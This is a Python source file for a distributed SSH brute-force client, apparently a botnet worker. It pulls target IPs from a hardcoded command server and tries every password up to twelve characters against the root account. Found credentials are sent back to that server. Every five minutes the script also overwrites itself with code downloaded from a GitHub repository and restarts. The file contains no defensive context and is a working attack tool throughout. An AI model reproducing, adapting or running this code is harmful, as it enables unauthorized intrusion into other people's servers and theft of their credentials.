import itertools
import time
import json
import paramiko
import requests
import base64
import threading
import subprocess
import sys
import logging
import os
from typing import Optional, Union

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

# Hardcoded settings
USERS = ["root"]
MAX_PASSWORD_LENGTH = 12
GITHUB_REPO_URL = (
    "https://api.github.com/repos/botsarefuture/ukrainetowin/contents/client.py"
)
API_BASE_URL = "http://65.108.222.76:5000"
TIMEOUT = 4


class Client:
    def __init__(
        self,
        api_base_url: str,
        timeout: int,
        github_repo_url: str,
        max_password_length: int,
        users: list[str],
        guess: Optional[str] = None,
        username: Optional[str] = None,
        target_ip: Optional[str] = None,
    ):
        self.target_ip = target_ip
        self.api_base_url = api_base_url
        self.timeout = timeout
        self.github_repo_url = github_repo_url
        self.max_password_length = max_password_length
        self.users = users
        self.guess = guess
        self.username = username
        self.lock = threading.Lock()

    def fetch_update(self):
        try:
            response = requests.get(self.github_repo_url)
            response.raise_for_status()
            remote_content = base64.b64decode(response.json()["content"]).decode(
                "utf-8"
            )

            with open(__file__, "r") as f:
                local_content = f.read()

            if remote_content != local_content:
                with open(__file__, "w") as f:
                    f.write(remote_content)
                logging.info("Updated the script from GitHub")

                # Restart the script with the updated version
                args = [sys.executable] + sys.argv
                subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                sys.exit()
        except requests.RequestException as e:
            logging.error(f"Error fetching updates from GitHub: {e}")

    def send_result_to_server(self, success: bool):
        url = f"{self.api_base_url}/result"
        data = {
            "target_ip": self.target_ip,
            "success": success,
            "username": self.username,
            "password": self.guess,
        }
        response = requests.post(
            url, json=data, headers={"Content-Type": "application/json"}
        )
        return response

    def send_error_to_server(self, error: str):
        url = f"{self.api_base_url}/error"
        data = {
            "target_ip": self.target_ip,
            "username": self.username,
            "guess": self.guess,
            "error": error,
        }
        response = requests.post(
            url, json=data, headers={"Content-Type": "application/json"}
        )
        return response

    def send_timeout_to_server(self):
        url = f"{self.api_base_url}/timeout"
        data = {"target_ip": self.target_ip}
        response = requests.post(
            url, json=data, headers={"Content-Type": "application/json"}
        )
        return response

    def send_ban_to_server(self):
        url = f"{self.api_base_url}/ban"
        data = {"target_ip": self.target_ip}
        response = requests.post(
            url, json=data, headers={"Content-Type": "application/json"}
        )
        return response

    def brute_force_password(self):
        alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"

        for length in range(1, self.max_password_length + 1):
            for combination in itertools.product(alphabet, repeat=length):
                guess = "".join(combination)
                self.guess = guess
                logging.info(f"Trying password {guess} for IP {self.target_ip}")
                result = self.brute()

                if result in (0, 6):
                    return

    def brute(self, attempt: int = 0) -> Union[int, None]:
        if attempt >= len(self.users):
            self.send_result_to_server(False)
            return 0

        self.username = self.users[attempt]
        result = self.ssh_login()

        if result == 1:
            self.send_result_to_server(True)
            return 0

        if result in (2, 3, 4, 6):
            return result

        return self.brute(attempt + 1)

    def ssh_login(self) -> int:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(
                self.target_ip,
                username=self.username,
                password=self.guess,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
            )
            client.close()
            return 1  # SSH login succeeded
        except paramiko.BadAuthenticationType as e:
            self.send_error_to_server(str(e))
            if "Invalid user" in str(e):
                return 5  # User doesn't exist
            if "Bad authentication type; allowed types: ['publickey']" in str(e):
                return 2  # Password authentication isn't supported
            return 0  # Other BadAuthenticationType exception occurred
        except paramiko.AuthenticationException:
            self.send_error_to_server("Wrong password")
            return 3  # Wrong password
        except paramiko.SSHException as e:
            self.send_error_to_server(str(e))
            logging.info(f"SSHException: {e}")
            if "not open" in str(e):
                return 2  # Server doesn't support password login
            if "Error reading SSH protocol banner" in str(e):
                return 4  # Connection error, potentially banned
            if "timed out" in str(e):
                logging.warning("Connection timed out")
                return 6  # Connection timed out
            if "Unable to connect to port 22" in str(e):
                self.send_ban_to_server()
                logging.critical("We're banned from port 22")
                return 4  # Probably banned
            return 0  # Other SSHException occurred
        except Exception as e:
            self.send_error_to_server(str(e))
            logging.error(f"Exception: {e}")
            if "timed out" in str(e):
                logging.warning("Connection timed out")
                return 6  # Connection timed out
            if "Unable to connect to port 22" in str(e):
                self.send_ban_to_server()
                logging.critical("We're banned from port 22")
                return 4
            return 0  # Other exceptions occurred

    def get_target_from_server(self):
        url = f"{self.api_base_url}/target"
        response = requests.get(url)
        data = response.json()
        self.target_ip = data.get("target_ip")

    def update_check_thread(self):
        while True:
            self.fetch_update()
            time.sleep(300)  # Check for updates every 5 minutes

    def run_client_forever(self):
        while True:
            try:
                self.get_target_from_server()
                if self.target_ip:
                    self.brute_force_password()
                else:
                    logging.warning("No more targets.")
                    time.sleep(60)  # Wait before checking for new targets
            except Exception as e:
                logging.error(f"Error occurred: {e}")
                time.sleep(5)  # Wait before restarting on error

    def start(self):
        # Start the update check thread in the background
        update_thread = threading.Thread(target=self.update_check_thread, daemon=True)
        update_thread.start()

        # Run the client forever with auto-restart on crash
        logging.info("Client starting")
        self.run_client_forever()


if __name__ == "__main__":
    client = Client(API_BASE_URL, TIMEOUT, GITHUB_REPO_URL, MAX_PASSWORD_LENGTH, USERS)
    client.start()
